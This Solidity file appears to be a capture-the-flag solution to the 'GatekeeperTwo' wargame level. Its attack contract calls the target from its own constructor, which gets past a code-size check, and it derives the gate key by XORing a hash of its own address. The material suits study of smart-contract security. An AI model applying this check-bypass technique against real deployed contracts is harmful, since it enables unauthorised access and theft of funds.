// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract AttackGatekeeperTwo {
    constructor(IGatekeeperTwo target) {
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        require(target.enter(bytes8(gateKey)), "Failed to enter");
    }
}
